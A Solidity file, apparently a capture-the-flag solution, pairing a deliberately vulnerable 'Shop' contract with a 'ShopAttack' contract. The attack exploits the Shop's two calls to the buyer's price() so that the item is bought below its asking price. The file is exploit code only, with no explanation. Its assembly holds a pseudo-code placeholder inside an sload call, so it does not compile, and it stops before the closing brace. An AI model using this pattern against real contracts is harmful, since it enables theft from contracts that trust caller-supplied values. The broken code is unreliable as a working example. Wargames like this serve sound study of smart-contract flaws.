pragma solidity ^0.6;
    
    interface Buyer {
      function price() external view returns (uint);
    }
    
    contract Shop {
      uint public price = 100;
      bool public isSold;
    
      function buy() public {
        Buyer _buyer = Buyer(msg.sender);
    
        if (_buyer.price.gas(3000)() >= price && !isSold) {
          isSold = true;
          price = _buyer.price.gas(3000)();
        }
      }
    }
    
    
    contract ShopAttack {
        Shop public challenge;
        
        constructor(Shop _challenge) public {
            challenge = Shop(_challenge);
        }
        
        function price() external view returns (uint) {
            assembly {
                let result
                
                switch sload(<calling challenge.isSold() from shop>)
                case 1 {
                    result := 99
                }
                default {
                    result := 100
                }
                
                mstore(0x0, result)
                return(0x0, 32)
            }
        }
    
      function attack() external {
        challenge.buy();
      }
